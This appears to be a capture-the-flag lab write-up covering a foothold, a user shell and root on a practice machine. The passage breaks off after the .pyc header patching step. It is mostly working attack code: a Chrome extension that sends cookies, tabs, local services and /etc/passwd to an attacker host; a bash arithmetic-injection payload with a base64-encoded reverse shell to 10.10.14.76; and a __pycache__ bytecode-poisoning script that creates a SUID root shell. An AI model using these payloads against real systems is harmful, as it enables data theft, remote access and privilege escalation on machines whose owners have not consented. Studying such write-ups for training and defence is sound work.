Foothold — Malicious Chrome Extension

Crafting the Malicious Extension

A Manifest V3 extension is crafted to exfiltrate data from the browser’s context — cookies, open tabs, internal service content, and local files.

manifest.json

json
{
  "manifest_version": 3,
  "name": "Helpful Extension",
  "version": "1.0.0",
  "permissions": ["storage", "scripting", "tabs", "cookies", "activeTab"],
  "host_permissions": ["<all_urls>"],
  "background": { "service_worker": "background.js" },
  "content_scripts": [{ "matches": ["<all_urls>"], "js": ["content.js"], "run_at": "document_idle" }]
}

background.js — steals cookies, tabs, and fetches internal services & local files:

javascript
const EXFIL = "http://<ATTACKER_IP>:9001/exfil";

async function exfil(tag, data) {
  try {
    await fetch(EXFIL + "?tag=" + encodeURIComponent(tag), {
      method: "POST", body: typeof data === "string" ? data : JSON.stringify(data)
    });
  } catch(e) {}
}

// Steal cookies
chrome.cookies.getAll({}, (cookies) => { exfil("cookies", cookies); });

// List open tabs
chrome.tabs.query({}, (tabs) => { exfil("tabs", tabs); });

// Fetch internal services and local files
const targets = [
  "http://127.0.0.1:3000/", "http://127.0.0.1:5000/",
  "file:///etc/passwd",    "file:///etc/hostname"
];
targets.forEach(async (url) => {
  try {
    const resp = await fetch(url);
    const text = await resp.text();
    exfil("fetch-" + url, text.substring(0, 5000));
  } catch(e) {}
});

content.js — captures full page HTML from every page the browser visits:

03

User Shell — Bash Arithmetic Evaluation Injection

Bash [[ ]] Arithmetic Evaluation Injection
Integer Comparison via -eq Triggers Command Substitution
In bash, the -eq operator inside [[ ]] performs arithmetic evaluation on operands. A payload like a[$(command)] is treated as an array subscript — causing bash to evaluate $(command) as the index expression, triggering arbitrary command execution. Although subprocess.run(["./routines.sh", rid]) avoids shell injection at the Python level, the bash script itself re-evaluates the input through arithmetic context.
Payload Construction

Flask’s default <rid> converter does not match slashes, so the payload must be slash-free. The reverse shell command is base64-encoded to avoid this constraint:

bash
echo -n 'bash -i >& /dev/tcp/10.10.14.76/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ni80NDQ0IDA+JjE=

The final arithmetic injection payload (no slashes):

payload
a[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ni80NDQ0IDA+JjE=|base64 -d|bash)]

Directory Structure Analysis
/opt/extensiontool/ ├── extension_tool.py root:root rwxrwxr-x ├── extension_utils.py root:root rw-rw-r-- ├── __pycache__/ root:root rwxrwxrwx <-- WORLD-WRITABLE └── extensions/ ├── Fontify/ ├── ReplaceImages/ └── Timer/

extension_tool.py imports from extension_utils:

python
from extension_utils import validate_manifest, clean_temp_files
The Vulnerability
Python __pycache__ Bytecode Poisoning
World-Writable Cache Directory + Timestamp/Size Spoofing
Python checks __pycache__/extension_utils.cpython-312.pyc before reading the source file. If the .pyc file’s embedded timestamp and source size match the original .py file, Python trusts and loads the cached bytecode without recompiling. Since __pycache__/ is world-writable, larry can plant a malicious .pyc with the correct header metadata, which will execute as root when sudo extension_tool.py is run.
Step 1 — Create Malicious extension_utils.py

The malicious module preserves the original API but executes a payload on import:

python — /tmp/extension_utils.py
import os, json, shutil
from jsonschema import validate, ValidationError

# Payload: create SUID bash copy
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")

MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name":             {"type": "string"},
        "version":          {"type": "string"},
    },
    "required": ["manifest_version", "name", "version"]
}

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:"); print(e.message); exit(1)

def clean_temp_files(extension_dir):
    temp_dir = '/opt/extensiontool/temp'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    exit(0)
Step 2 — Compile and Patch .pyc Header

The .pyc header must be patched to match the original source file’s mtime (2025-03-23 10:56:19 UTC) and size (1245 bytes) so Python trusts the cache:

python — patch_pyc.py
import py_compile, struct, calendar, time

# Compile malicious module
py_compile.compile('/tmp/extension_utils.py', '/tmp/extension_utils.cpython-312.pyc')

with open('/tmp/extension_utils.cpython-312.pyc', 'rb') as f:
    data = bytearray(f.read())

# Match original source: mtime = 2025-03-23 10:56:19 UTC, size = 1245 bytes
ts   = int(calendar.timegm(time.strptime('2025-03-23 10:56:19', '%Y-%m-%d %H:%M:%S')))
size = 1245

# .pyc header: magic(4) + flags(4) + timestamp(4) + source_size(4)
struct.pack_into('<I', data, 4,  0)     # flags = 0 (timestamp-based validation)
struct.pack_into('<I', data, 8,  ts)    # mtime of original source
struct.pack_into('<I', data, 12, size)  # size of original source

with open('/tmp/extension_utils.cpython-312.pyc', 'wb') as f:
    f.write(data)
